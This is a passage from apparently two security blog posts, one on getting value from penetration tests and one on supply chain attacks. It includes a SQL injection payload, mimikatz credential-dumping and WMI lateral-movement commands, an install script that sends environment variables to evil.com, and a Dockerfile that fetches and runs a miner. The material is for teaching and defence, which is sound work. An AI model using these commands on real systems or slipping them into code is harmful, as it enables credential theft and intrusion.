network\u0026rdquo; \u0026ldquo;We\u0026rsquo;re worried about someone stealing customer data from our web application\u0026rdquo; \u0026ldquo;We\u0026rsquo;re worried about a compromised developer credential leading to production access\u0026rdquo; \u0026ldquo;We\u0026rsquo;re worried about our cloud infrastructure being misconfigured\u0026rdquo; Each concern maps to a different scope.\nStep 2: Define the starting point Where does the attacker start?\nExternal: Internet-facing systems, no credentials Internal: Inside the network, maybe with domain user credentials Cloud: With read-only cloud console access Physical: On-premises, trying to plug into network ports Social engineering: Targeting employees via phishing, vishing, pretexting Supply chain: Starting from a vendor or partner access point\nDifferent starting points test different controls. External tests your perimeter. Internal tests your segmentation and endpoint security. Cloud tests your IAM and configuration.\nStep 3: Define the goal What counts as success for the attacker?\n\u0026ldquo;Access to customer database\u0026rdquo; \u0026ldquo;Domain administrator access\u0026rdquo; \u0026ldquo;Ability to exfiltrate data\u0026rdquo; \u0026ldquo;Access to production Kubernetes cluster\u0026rdquo; \u0026ldquo;Code execution on production servers\u0026rdquo; Clear goals make for clear findings. \u0026ldquo;Attacker could have achieved X by exploiting Y\u0026rdquo; is actionable. \u0026ldquo;Attacker found vulnerabilities\u0026rdquo; is not.\nStep 4: Define what\u0026rsquo;s in scope and out of scope In scope:\nSpecific IP ranges Specific applications Specific cloud accounts Specific attack vectors Out of scope:\nDenial of service (unless specifically agreed) Social engineering of specific individuals (unless consented) Physical security (unless specifically scoped) Third-party systems you don\u0026rsquo;t control Be specific. \u0026ldquo;All cloud infrastructure\u0026rdquo; is too vague. \u0026ldquo;AWS account 123456789012, production VPC, EKS cluster and associated services\u0026rdquo; is specific.\nSample Scope Document # Penetration Test Scope ## Engagement Details - **Client:** Acme Corp - **Duration:** 10 business days (excluding retesting) - **Testing window:** 09:00-18:00 UTC, Monday-Friday - **Start date:** 2025-03-10 - **Primary contact:** Jane Smith (jane@acme.corp) - **Emergency contact:** +44 7XXX XXXXXX ## Objectives 1. Assess external perimeter security 2. Attempt to access internal network from external starting point 3. Evaluate detection and response capabilities ## Scope ### In Scope **IP Ranges:** - 203.0.113.0/24 (public-facing services) - 198.51.100.10-20 (API endpoints) **Applications:** - https://app.acme.corp (customer portal) - https://api.acme.corp (public API) - https://admin.acme.corp (internal admin, accessible via VPN) **Cloud Infrastructure:** - AWS account 123456789012 - VPC vpc-prod-12345 - EKS cluster prod-cluster - S3 buckets matching pattern acme-prod-* ### Out of Scope - Production data modification - Denial of service attacks - Social engineering (separate engagement) - Physical security testing - Third-party hosted services (Cloudflare, Auth0) - 203.0.113.50 (partner integration, written approval required) ## Rules of Engagement - Stop testing immediately if production impact suspected - Report critical findings within 4 hours of discovery - No testing on weekends without explicit approval - All testing traffic should use X-Test-Engagement: ACME-2025-03 header where possible ## Deliverables - Draft report within 5 business days of testing completion - Final report within 3 business days of feedback - Executive summary (2 pages max) - Technical findings with evidence - Remediation guidance - Retesting of critical/high findings included Step 5: Define the rules of engagement When can testing happen?\nBusiness hours only? 24/7? Specific maintenance windows? What happens if something breaks?\nStop and report immediately? Continue if impact is minimal? How do you communicate?\nSingle point of contact? Regular check-ins? Emergency contact procedure? Working With Pentesters Internal vs External Internal pentest team:\nKnows your environment better Faster to mobilise Can test more frequently May have blind spots from familiarity May have conflicts of interest (testing their own work) External pentest firm:\nFresh perspective No organisational blind spots Broader experience across industries More expensive Takes longer to understand environment Best approach: both. Internal team for continuous testing, external for annual assessment. External validates internal isn\u0026rsquo;t missing things.\nRed Flags in Pentest Proposals \u0026ldquo;We use proprietary AI-powered testing methodology\u0026rdquo;\nNo you don\u0026rsquo;t. You use standard tools and techniques. \u0026ldquo;AI-powered\u0026rdquo; is marketing. Ask what tools they actually use.\n\u0026ldquo;We\u0026rsquo;ll test everything for $X\u0026rdquo;\nYou can\u0026rsquo;t test everything for any price. Scope is finite. If they claim otherwise, they\u0026rsquo;re lying or they don\u0026rsquo;t understand what they\u0026rsquo;re testing.\n\u0026ldquo;We guarantee to find critical vulnerabilities\u0026rdquo;\nNo you don\u0026rsquo;t. You might find none. A clean report is possible. If they guarantee findings, they\u0026rsquo;ll manufacture them or find trivial issues and inflate severity.\n\u0026ldquo;We\u0026rsquo;ll provide a pass/fail certification\u0026rdquo;\nPenetration testing doesn\u0026rsquo;t pass or fail. It produces findings. You decide what to do with them. \u0026ldquo;Certification\u0026rdquo; is for compliance checkboxes, not security improvement.\nWhat to Ask Potential Pentesters \u0026ldquo;Walk me through your methodology.\u0026rdquo;\nThey should describe something like:\nReconnaissance (what\u0026rsquo;s exposed, what technologies) Vulnerability discovery (scanning, manual testing) Exploitation (proving vulnerabilities are real) Post-exploitation (what access enables) Reporting (clear, actionable findings) If they can\u0026rsquo;t explain it clearly, they don\u0026rsquo;t have a methodology. They have tools and hope.\n\u0026ldquo;What\u0026rsquo;s your background?\u0026rdquo;\nYou want:\nPeople who\u0026rsquo;ve done offensive security work Certifications are fine but not required (OSCP, OSEE, GPEN demonstrate knowledge) Experience in your industry (healthcare, finance, SaaS have different concerns) Code background if testing applications You don\u0026rsquo;t want:\nSomeone who took a course last month Someone who only knows how to run tools Someone who can\u0026rsquo;t explain what they\u0026rsquo;re doing \u0026ldquo;Can I see a sample report?\u0026rdquo;\nRedact client names, but show structure:\nExecutive summary (for management) Technical details (for engineers) Evidence (screenshots, commands, outputs) Remediation guidance (how to fix) Risk rating (critical/high/medium/low with justification) If the sample report is vague, your report will be vague.\n\u0026ldquo;What happens if you find a critical vulnerability on day 1?\u0026rdquo;\nGood answer: \u0026ldquo;We notify you immediately, discuss whether to continue or pause, and adjust scope if needed.\u0026rdquo;\nBad answer: \u0026ldquo;We continue testing and include it in the final report.\u0026rdquo;\n\u0026ldquo;Do you offer retesting?\u0026rdquo;\nGood answer: \u0026ldquo;Yes, included in the engagement or as a follow-up at reduced rate.\u0026rdquo;\nBad answer: \u0026ldquo;That\u0026rsquo;s a separate engagement.\u0026rdquo;\nWhat to Do With Findings Triage Immediately Pentest report arrives with 47 findings. Which ones matter?\nCritical: Attacker can achieve their goal, or can get close with minimal effort. Fix now.\nHigh: Attacker can gain significant access or information. Fix within days.\nMedium: Attacker can gain limited access or information. Fix within weeks.\nLow: Attacker can gain minimal access or information. Fix eventually.\nBut severity isn\u0026rsquo;t the only factor. Consider:\nExploitability: Is there a working exploit? Is it easy to use?\nBusiness impact: What does this system do? What data does it hold?\nExposure: Is this internet-facing? Internal only? Air-gapped?\nCompensating controls: Does something else partially mitigate this?\nTriage Example Pentest returns with these findings. Which do you fix first?\nFinding Severity Exposure Business Impact Exploitability Priority SQL injection in login form Critical Internet Customer DB access Trivial (sqlmap) Fix now Outdated jQuery on marketing site Medium Internet None (static content) Complex Fix eventually SMB signing disabled Medium Internal File server access Moderate Fix this month Debug endpoint exposed on API High Internet Internal API docs Easy Fix within days Self-signed cert on internal app Low Internal None N/A Low priority Default creds on dev database Critical Internal (no segmentation) Dev data leak Trivial Fix now The critical internal finding might be more urgent than the high external finding if internal network is flat and attacker already has VPN access.\nSample Finding Structure A good pentest finding looks like this:\n## Finding: SQL Injection in User Search **Severity:** Critical **CVSS:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) **Affected Asset:** https://app.acme.corp/users/search **Description:** The user search endpoint accepts a `name` parameter that is directly concatenated into a SQL query without sanitisation. An unauthenticated attacker can extract the entire user database. **Proof of Concept:** Request: ```http POST /users/search HTTP/1.1 Host: app.acme.corp Content-Type: application/x-www-form-urlencoded name=admin\u0026#39; UNION SELECT id,email,password_hash,\u0026#39;4\u0026#39; FROM users-- ``` Response contains user table data: ```json [{\u0026#34;id\u0026#34;:1,\u0026#34;name\u0026#34;:\u0026#34;admin@acme.corp\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;$2b$12$...\u0026#34;}] ``` **Impact:** - Full database read access (customer PII, credentials) - Potential database write access (modify/delete records) - Compliance breach (GDPR, PCI-DSS) **Remediation:** 1. Use parameterised queries for all database operations 2. Implement input validation whitelist (alphanumeric only) 3. Apply least-privilege database permissions 4. Add web application firewall rule as temporary mitigation **References:** - OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection - CWE-89: https://cwe.mitre.org/data/definitions/89.html **Retest Required:** Yes A medium finding on an internet-facing system might be higher priority than a critical finding on an isolated internal system.\nDon\u0026rsquo;t Just Patch Pentester found SQL injection. You patch the specific injection point. Job done?\nNo. The finding tells you:\nInput validation is missing or inadequate The application wasn\u0026rsquo;t tested for this class of vulnerability Developer training or code review missed this Fix the finding. Then ask why it existed and fix the root cause.\nVerify Fixes Work Fix deployed. How do you know it works?\nOption 1: Retest by pentester. Best, but costs money and takes time.\nOption 2: Internal verification. Reproduce the issue, verify the fix blocks it. Faster, cheaper, but might miss edge cases.\nOption 3: Automated verification. Some vulnerabilities can be verified with automated tools. Quick but limited.\nDo at least one. \u0026ldquo;We fixed it\u0026rdquo; without verification is hope, not security.\nTrack Over Time Findings this year vs last year:\nSame vulnerabilities appearing? Root cause not addressed. New vulnerability classes? Something changed in your stack or process. Fewer findings? Maybe you\u0026rsquo;re improving. Maybe scope was smaller. Track trends, not just individual findings.\nRemediation Tracking Template Don\u0026rsquo;t let findings disappear into a PDF. Track them like any other work.\nSummary section:\nTotal findings count by severity (Critical/High/Medium/Low) Status counts (Fixed/In progress/Accepted risk) Retest status (Retested/Verified fixed/Fix failed) Findings table columns:\nColumn Purpose ID Unique identifier (e.g., PENT-001) for cross-referencing Finding Short description Severity Critical/High/Medium/Low Owner Specific person responsible Status Fixed/In progress/Accepted Due Target date Retest Pass/Fail/Pending Notes Additional context Accepted risks table:\nColumn Purpose ID Links to finding Rationale Why accepted Compensating Controls What mitigates it Review Date When to reassess Retest results table:\nColumn Purpose ID Original finding reference Original Finding What was found Fix Applied What was changed Retest Date When retested Result Fixed/Failed Follow-up Next action if failed Example row:\n| PENT-001 | SQL injection in search | Critical | Backend | Fixed | 2025-11-22 | Pass | Parameterised queries | Track this in whatever system works - spreadsheet, Jira, Notion, GitHub issues. The format matters less than the tracking.\nKey elements:\nUnique ID for each finding (reference in all discussions) Clear ownership (someone specific, not \u0026ldquo;the team\u0026rdquo;) Due dates that are realistic Retest status (don\u0026rsquo;t assume fix worked) Accepted risks documented with rationale and review dates Running Your Own Testing Program You don\u0026rsquo;t need to hire external pentesters for everything. Build internal capability.\nBug Bounty Programs Let anyone test your public-facing systems. Pay for valid findings.\nPros:\nContinuous testing, not annual Diverse attacker perspectives Pay only for results Cons:\nQuality varies wildly Can attract low-effort submissions Requires triage resources Public perception risk if not managed well Best for: Mature organisations with public-facing applications and resources to triage submissions.\nInternal Red Team Dedicated team that continuously tests your defences.\nActivities:\nPhishing campaigns (test detection and user awareness) Network pentests (test segmentation and monitoring) Application testing (test SDLC security) Social engineering (test physical and human security) Cloud configuration testing (test IaC and cloud security) Pros:\nKnows your environment Can test continuously Can coordinate with blue team for learning Cons:\nExpensive (dedicated headcount) May develop blind spots Can be seen as adversarial by other teams Best for: Large organisations with security budget and mature security programs.\nComparison: Which Testing Approach? Approach Frequency Cost Depth Coverage Best For External pentest Annual High (£10k-100k) Deep Narrow (scoped) Compliance, validation Bug bounty Continuous Variable (per-finding) Variable Public-facing only Mature orgs with public apps Internal red team Continuous High (headcount) Deep Broad Large orgs, continuous improvement Purple team Quarterly Medium Medium Targeted Improving detection/response Vulnerability scanning Weekly Low Shallow Broad Hygiene, known issues Automated DAST Per-deploy Low Medium Application layer CI/CD integration Recommendation:\nSmall org: Annual external pentest + weekly vulnerability scanning Medium org: Annual external + quarterly internal + continuous scanning Large org: All of the above + red team + bug bounty Purple Team Exercises Red team attacks. Blue team defends. They talk to each other.\nTraditional: red team does something, blue team might detect it, report comes months later.\nPurple team: red team says \u0026ldquo;we\u0026rsquo;re going to try technique X,\u0026rdquo; blue team watches for it, they discuss what worked and what didn\u0026rsquo;t.\nPros:\nFaster learning Both sides improve Less adversarial Cons:\nRequires coordination Less realistic than blind testing Can become checkbox exercises Best for: Organisations wanting to improve detection and response, not just find vulnerabilities.\nSample Purple Team Exercise Objective: Test detection of credential theft and lateral movement.\nRed team action:\n# Dump LSASS memory (Simulated attack) mimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonpasswords\u0026#34; \u0026#34;exit\u0026#34; # Use obtained credentials runas /user:ACME\\jsmith /netonly cmd.exe # Lateral movement via WMI wmic /node:10.0.0.50 /user:ACME\\jsmith /password:... process call create \u0026#34;cmd.exe\u0026#34; Blue team monitors for:\nLSASS access by non-system processes Unusual authentication patterns WMI execution from non-admin workstations Lateral movement to sensitive systems Discussion points after exercise:\nDid SIEM alert on LSASS access? How long until someone investigated? Was the lateral movement detected? What visibility gaps exist? What detection rules need improvement? Documentation:\n# Purple Team Exercise: 2025-03-15 ## Attack Emulated: Credential theft + lateral movement ## Detection Time: 4 minutes (LSASS), 12 minutes (lateral movement) ## Investigated: Yes (8 minutes after alert) ## Containment: Manual intervention required ## Findings: 1. LSASS alert fires but is buried in alert queue - increase priority 2. WMI lateral movement not detected for non-admin users - add rule 3. No alert when credential used from unusual workstation - add correlation ## Actions: - [ ] Increase LSASS alert severity to critical - [ ] Add detection rule for WMI from non-admin sources - [ ] Create correlation rule for credential use from new workstation - [ ] Schedule follow-up exercise for 2025-04-15 Continuous Vulnerability Scanning Not pentesting, but related. Automated scanning for known vulnerabilities.\nNuclei for CVE scanning:\nnuclei -l urls.txt -t cves/ -t vulnerabilities/ -o nuclei-findings.txt cat urls.txt https://app.acme.corp https://api.acme.corp https://admin.acme.corp Nikto for web server misconfigurations:\nnikto -h https://app.acme.corp -output nikto-app.txt -Format txt nikto -h https://api.acme.corp -output nikto-api.txt -Format txt ZAP baseline scan for common issues:\ndocker run -t owasp/zap2docker-stable zap-baseline.py \\ -t https://app.acme.corp \\ -r zap-report.html # More thorough scan (takes longer) docker run -t owasp/zap2docker-stable zap-full-scan.py \\ -t https://app.acme.corp \\ -r zap-full-report.html Scheduled scanning with cron:\n# /etc/cron.d/vuln-scan 0 2 * * 1 security /opt/scans/run-weekly-scan.sh #!/bin/bash # /opt/scans/run-weekly-scan.sh DATE=$(date +%Y%m%d) SCAN_DIR=\u0026#34;/var/scans/$DATE\u0026#34; mkdir -p \u0026#34;$SCAN_DIR\u0026#34; # Nuclei cat /opt/scans/targets.txt | nuclei \\ -t /opt/nuclei-templates/cves/ \\ -t /opt/nuclei-templates/vulnerabilities/ \\ -o \u0026#34;$SCAN_DIR/nuclei.txt\u0026#34; # Check for critical findings and alert if grep -q \u0026#34;critical\u0026#34; \u0026#34;$SCAN_DIR/nuclei.txt\u0026#34;; then mail -s \u0026#34;[CRITICAL] Vulnerability scan found critical issues\u0026#34; \\ security@acme.corp \u0026lt; \u0026#34;$SCAN_DIR/nuclei.txt\u0026#34; fi # Nikto while read url; do nikto -h \u0026#34;$url\u0026#34; -output \u0026#34;$SCAN_DIR/nikto-$(echo $url | sha256sum | cut -c1-8).txt\u0026#34; done \u0026lt; /opt/scans/targets.txt Run weekly. Triage results. Don\u0026rsquo;t let findings pile up.\nThis doesn\u0026rsquo;t replace pentesting. It handles the low-hanging fruit so pentesters can focus on interesting things.\nQuick Checks Before You Pay for a Pentest Have you fixed the findings from the last pentest?\nIf no, another pentest won\u0026rsquo;t help. Fix what you already know about first.\nDo you have a vulnerability management program?\nIf you\u0026rsquo;re not patching known vulnerabilities, a pentest will find them. Fix your patching process first.\nDo you have basic security controls in place?\nMFA, network segmentation, logging, patching. If not, pentest will find what you already know you\u0026rsquo;re missing.\nDo you know what you\u0026rsquo;re worried about?\nIf you can\u0026rsquo;t articulate your top 3 security concerns, you\u0026rsquo;re not ready for a pentest. Figure out what matters first.\nDo you have capacity to fix findings?\nIf pentest produces 50 findings and you can fix 5 per month, you\u0026rsquo;ll never catch up. Build remediation capacity first.\nThe Boring Truth Penetration testing is a tool, not a solution. A good pentest tells you what an attacker could do right now with a specific scope. That\u0026rsquo;s valuable. But it\u0026rsquo;s a snapshot, not a guarantee.\nThe organisations that get value from pentesting:\nKnow what they\u0026rsquo;re worried about and scope accordingly Fix findings quickly and verify fixes work Address root causes, not just individual vulnerabilities Test continuously, not annually Build internal capability to supplement external testing The organisations that don\u0026rsquo;t get value:\nBuy pentests for compliance checkboxes File reports without reading them Fix findings slowly or not at all Repeat the same pentest every year with same results Treat pentesting as a substitute for basic security hygiene If you\u0026rsquo;re in the second group, save your money. A pentest won\u0026rsquo;t fix problems you\u0026rsquo;re not willing to fix yourself.\nBallpark Costs (UK/US, 2025) So you know what to budget. These are rough ranges - actual costs vary by provider, complexity, and location.\nExternal network pentest (perimeter):\nSmall scope (5-10 IPs): £3,000-8,000 / $4,000-10,000 Medium scope (10-50 IPs): £8,000-20,000 / $10,000-25,000 Large scope (50+ IPs): £20,000-50,000+ / $25,000-60,000+ Web application pentest:\nSimple app (10-20 endpoints): £5,000-12,000 / $6,000-15,000 Medium complexity: £12,000-25,000 / $15,000-30,000 Complex app (many features, auth flows): £25,000-50,000+ / $30,000-60,000+ Internal network pentest:\nSmall network (single site): £8,000-15,000 / $10,000-18,000 Medium network (multiple subnets): £15,000-30,000 / $18,000-35,000 Large enterprise: £30,000-75,000+ / $35,000-90,000+ Cloud infrastructure review:\nSingle cloud account: £5,000-12,000 / $6,000-15,000 Multi-account/multi-cloud: £12,000-30,000 / $15,000-35,000 Red team engagement (simulated attack):\nShort (2 weeks): £20,000-40,000 / $25,000-50,000 Standard (4-6 weeks): £40,000-100,000 / $50,000-120,000 Extended (8+ weeks): £100,000+ / $120,000+ Bug bounty programs:\nPlatform fees (HackerOne, Bugcrowd): £15,000-50,000/year + bounties Bounty budgets: Variable (typically £10,000-100,000/year for medium programs) What affects price:\nScope size (obviously) Complexity (custom protocols, unusual tech) Timeline (rush jobs cost more) Provider reputation (big names charge more) Retesting included vs separate Report quality (exec + technical vs technical only) Warning signs:\nQuote is 50% below market rate - corners being cut Quote has no scope detail - they don\u0026rsquo;t know what they\u0026rsquo;re testing Quote is time-based not scope-based - you\u0026rsquo;re paying for days, not results Based on years of commissioning, receiving, and occasionally conducting penetration tests. Some were excellent and taught me things I didn\u0026rsquo;t know. Most were expensive confirmation of things I already knew. The difference wasn\u0026rsquo;t the pentester - it was how the engagement was scoped and what happened after the report arrived.\n","date":"20 Nov 2025","permalink":"https://gazsecops.github.io/posts/penetration-testing-what-works/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We need a penetration test for compliance.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e What are we testing?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e Everything.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e That\u0026rsquo;s not a scope. What\u0026rsquo;s the goal?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e The goal is to check the box that says we had a penetration test.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e Then you don\u0026rsquo;t need a pentest. You need a rubber stamp.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eMost penetration testing is security theater. A PDF appears once a year, lists findings you already knew about, gets filed away, nothing changes. The checkbox is ticked. Compliance is satisfied. Security hasn\u0026rsquo;t improved.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\nA pentest that tells you what you already know is an expensive way to avoid fixing problems. A pentest that surprises you is valuable - but only if you actually fix what it finds.\n\u003c/aside\u003e\n\u003cp\u003eThis isn\u0026rsquo;t about shitting on pentesters. Good pentesters are worth their weight in gold. This is about how to get actual value from penetration testing instead of buying an expensive PDF that nobody reads.\u003c/p\u003e","tags":["security","penetration-testing","red-team","operations","assessment"],"title":"Penetration Testing: What Actually Works vs What You Usually Get"},{"content":" Management: Our own code is secure. Dependencies from npm, GitHub, Docker Hub. That\u0026rsquo;s safe, right?\nSysadmin: That\u0026rsquo;s where most attacks actually happen.\nManagement: But those maintainers are legit companies!\nSysadmin: So were SolarWinds and Log4j maintainers. What\u0026rsquo;s your point?\n\"The attack surface isn't what you wrote. It's everything you trusted. And you trusted a lot.\" We obsess over secure coding practices. Input validation, authentication, access controls. But then we pull in 2000 dependencies from npm, PyPI, Docker Hub. We download images, run unverified binaries, trust package maintainers we\u0026rsquo;ve never met.\nThat\u0026rsquo;s where supply chain attacks live. Not in your code. In everyone else\u0026rsquo;s.\nThe Supply Chain Problem Your application isn\u0026rsquo;t just your code. It\u0026rsquo;s your code + every dependency, every library, every container image, every tool in your build pipeline. Each one is a potential attack vector.\nThe attack surface:\nYour Application ├── npm dependencies (hundreds of packages) ├── Python packages (more packages) ├── Docker images (base images + layers) ├── CI/CD tools (GitHub Actions, build scripts) └── Transitive dependencies (dependencies of dependencies) Every single one of these could be: - Compromised maintainer - Typosquatted package name - Malicious version bump - Hijacked repository - Vulnerable transitive dependency You review your code. Do you review every line of every dependency? Every layer of every container image? Every GitHub Action used in your pipeline?\nThat\u0026rsquo;s the supply chain problem.\nAttack Types (With Real Examples) 1. Typosquatting Attacker publishes a package with a name that looks legitimate but has a typo.\nExample: crossenv vs cross-env\nIn 2017, a security researcher discovered crossenv - a malicious npm package designed to look like the popular cross-env package. It harvested environment variables and sent them to attacker-controlled server.\n// Malicious package.json { \u0026#34;name\u0026#34;: \u0026#34;crossenv\u0026#34;, // Looks like cross-env \u0026#34;version\u0026#34;: \u0026#34;1.0.0\u0026#34;, \u0026#34;scripts\u0026#34;: { \u0026#34;install\u0026#34;: \u0026#34;node -e \\\u0026#34;require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl -X POST https://evil.com/steal -d \\\\\\\u0026#34;`+JSON.stringify(process.env)+`\\\\\\\u0026#34;\u0026#39;);\\\u0026#34;\u0026#34; } } How it works:\nDeveloper types npm install crossenv (typo) Malicious package installs, runs install script Environment variables (AWS keys, database URLs, API tokens) exfiltrated Attack waits for stolen credentials Mitigation:\nLock your dependencies (package-lock.json, requirements.txt) Audit new dependencies before install Use tools like npm audit, pip-audit Two-factor authentication for npm/pypi publishing 2. Build System Compromise Attacker compromises the build pipeline of a legitimate software vendor, injecting malicious code into official releases.\nExample: SolarWinds Attack (2020)\nThis was the attack that woke everyone up. SolarWinds Orion platform was compromised through a malicious update inserted during the build process.\nWhat happened:\nAttackers compromised SolarWinds build system Inserted malicious code into Orion.Core.dll Validly signed with SolarWinds certificate Distributed as update 2020.2.1 HF Installed by 18,000+ customers worldwide Result: Attackers gained access to US government agencies, Fortune 500 companies, critical infrastructure.\nWhy it worked:\nPackage was legitimately signed (maintainer trust) Came from official update channel (infrastructure trust) Looked like normal update (no red flags) Mitigation:\nVerify signatures against multiple sources Monitor maintainers\u0026rsquo; own security posture Delay updates by testing in staging Implement integrity verification (SBOMs, checksums) Related: See my post on Canary Tokens for early detection when prevention fails.\n3. Maintainer Account Hijacking Attacker compromises maintainer\u0026rsquo;s account, publishes malicious package.\nExample: event-stream npm package (2018)\nPopular npm package event-stream was compromised after the original maintainer handed over control to a new contributor who then injected malicious code targeting the Copay Bitcoin wallet.\nWhat happened:\nOriginal maintainer handed over repository control to a new contributor New contributor added a malicious dependency (flatmap-stream) Malicious code targeted Copay Bitcoin wallet specifically Cryptocurrency wallets drained from Copay users Detection: Users noticed unusual behavior. Package had 2 million weekly downloads.\nMitigation:\nMaintainers should use hardware keys for signing Enable two-factor authentication on npm/PyPI/GitHub Monitor maintainers\u0026rsquo; accounts for suspicious activity Don\u0026rsquo;t auto-update critical dependencies without review 4. Container Image Attacks Attacker compromises Docker base image or adds malicious layer.\nExample: Docker Hub Image Exploits\nMultiple incidents where Docker images were compromised:\nCase 1: Docker Hub breach (2019)\nDocker Hub itself was breached, exposing 190,000 accounts Attackers gained access to tokens and credentials Potentially affected builds pulling from compromised accounts Case 2: Bitcoin-stealing images (ongoing)\nImages that mine cryptocurrency on deployment Hidden in legitimate-looking base images Organizations pay for unknowingly running miners Example malicious Dockerfile:\nFROM node:16 # Hidden in legitimate-looking install RUN curl -o /tmp/crypto-miner https://evil.com/miner \u0026amp;\u0026amp; \\ chmod +x /tmp/crypto-miner \u0026amp;\u0026amp; \\ /tmp/crypto-miner --background \u0026amp;\u0026amp; \\ rm -f /tmp/crypto-miner # Normal application setup continues... COPY . /app RUN npm install CMD [\u0026#34;node\u0026#34;, \u0026#34;index.js\u0026#34;] Detection: Unusual CPU usage in containers. Mining runs continuously.\nMitigation:\nPull from official registries only (Docker Hub official images) Verify image signatures (Docker Content Trust) Use SBOMs (Software Bill of Materials) Build your own base images when possible Scan images with tools like Trivy, Clair 5. CI/CD Pipeline Injection Attacker compromises GitHub Actions, Dockerfile, or build script.\nExample: GitHub Actions Token Theft\nCommon pattern:\nRepository uses fork of popular template Template has vulnerable GitHub Action Action logs GITHUB_TOKEN to attacker-controlled server Attacker uses token to modify repositories, steal secrets Example vulnerable GitHub Action:\nname: CI on: [push] jobs: build: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - name: Debug build run: | # Oops, this logs environment variables env - name: Deploy # Attacker-controlled action uses: attacker/malicious-action@v1 with: # This action exfiltrates GITHUB_TOKEN api-key: ${{ secrets.API_KEY }} Mitigation:\nUse permissions: field in GitHub Actions to limit token access Don\u0026rsquo;t use third-party actions from untrusted sources Review Action source code Don\u0026rsquo;t log secrets or environment variables Use OIDC for authentication instead of static secrets 6. Transitive Dependency Attacks Attack a dependency\u0026rsquo;s dependency, not the direct dependency.\nExample: eslint-scope Attack (2018)\nAttacker compromised eslint-scope package, which was a dependency of thousands of projects.\nWhat happened:\neslint-scope was a transitive dependency of popular packages Attackers compromised maintainer account Published malicious version 3.0.0 Any project depending on affected packages got malicious code The problem: Your project doesn\u0026rsquo;t directly depend on eslint-scope. But one of your dependencies does. You\u0026rsquo;re still vulnerable.\nMitigation:\nLock dependency tree completely Regularly run npm audit, pip-audit, cargo audit Use tools that scan entire dependency tree (Snyk, Dependabot) Update dependencies regularly (but test in staging first) Example: Log4Shell (CVE-2021-44228)\nLog4j wasn\u0026rsquo;t a malicious package. That\u0026rsquo;s what made it worse.\nIt was a widely trusted logging library, pulled into everything from Java apps to vendor appliances. In practice it behaved like a transitive dependency attack because:\nYou often didn\u0026rsquo;t know you had Log4j at all (it came in via something else) You couldn\u0026rsquo;t patch it directly (you had to patch the thing that bundled it) You ended up with multiple copies in weird places (fat JARs, shaded deps, vendor installers) What actually broke:\nA logged string could trigger a network lookup and load code via JNDI Attackers sprayed it into anything that might get logged (HTTP headers, usernames, chat messages) Your defence depended as much on outbound network controls as it did on patching Why it was hard:\nAsset inventory was missing (nobody could answer \u0026ldquo;where is Log4j used?\u0026rdquo;) Patching meant rebuilding and redeploying a lot of things Some vendor products needed a vendor patch, and your timeline wasn\u0026rsquo;t your own Mitigation that worked in real life:\nPatch/upgrade fast (and verify the deployed version, don\u0026rsquo;t trust the ticket) Block unnecessary outbound LDAP/RMI/DNS from app servers (you don\u0026rsquo;t need most of that) Use SBOMs so next time you can answer \u0026ldquo;where is it?\u0026rdquo; in minutes, not days Practical Mitigation Framework Tier 1: Fundamentals (Do This Immediately) 1. Dependency Locking\n# npm npm install --package-lock-only # Python pip freeze \u0026gt; requirements.txt # Go go mod vendor # Rust cargo generate-lockfile This locks exact versions, prevents typosquatting and accidental updates.\n2. Dependency Auditing\n# npm npm audit npm audit fix # Python pip-audit # Go go list -json -m all | nancy sleuth # Docker trivy image your-image:tag Run these regularly, preferably in CI/CD.\n3. Two-Factor Authentication Enable 2FA on:\nnpm PyPI GitHub Docker Hub GitLab Maintainer accounts should use hardware security keys (YubiKeys, etc.)\nTier 2: Advanced (Do This If You Have Resources) 1. SBOMs (Software Bill of Materials) Track all dependencies, including transitive ones.\nDon\u0026rsquo;t treat this as paperwork. Treat it as your \u0026ldquo;where is Log4j?\u0026rdquo; button.\nGenerate an SBOM for a container image:\nsyft your-image:tag -o cyclonedx-json=sbom.cdx.json Or for a repo/build output directory:\nsyft dir:. -o cyclonedx-json=sbom.cdx.json Then scan the SBOM:\ngrype sbom:sbom.cdx.json Practical workflow:\nGenerate SBOM in CI for every build Store it next to the artifact/image Fail the build on high/critical findings you care about When the next Log4Shell happens, you query SBOMs instead of grepping random servers 2. Private Package Registries Mirror public packages to private registry:\n# npm .npmrc: registry=https://npm.yourcompany.com/ # Python pip install --index-url https://pypi.yourcompany.com/simple/ Curate what gets into your registry. Block malicious packages.\n3. Sigstore / Cosign Sign your artifacts:\n# Keyless signing (recommended if you\u0026#39;re already on GitHub Actions/OIDC) cosign sign --keyless your-image:tag # Verify by identity and issuer (this is what you enforce) cosign verify \\ --certificate-identity \u0026#34;https://github.com/ORG/REPO/.github/workflows/build.yml@refs/heads/main\u0026#34; \\ --certificate-oidc-issuer \u0026#34;https://token.actions.githubusercontent.com\u0026#34; \\ your-image:tag You can also attach the SBOM as an attestation:\nsyft your-image:tag -o cyclonedx-json=sbom.cdx.json cosign attest --keyless --predicate sbom.cdx.json --type cyclonedx your-image:tag cosign verify-attestation \\ --type cyclonedx \\ --certificate-identity \u0026#34;https://github.com/ORG/REPO/.github/workflows/build.yml@refs/heads/main\u0026#34; \\ --certificate-oidc-issuer \u0026#34;https://token.actions.githubusercontent.com\u0026#34; \\ your-image:tag Integrate signature verification into CI/CD pipeline.\nTier 3: Operational (Make This Part of Your Process) 1. Dependency Review Process Before adding new dependency:\nCheck maintainer reputation Review recent commits Look at open issues Check security advisories Verify project has active 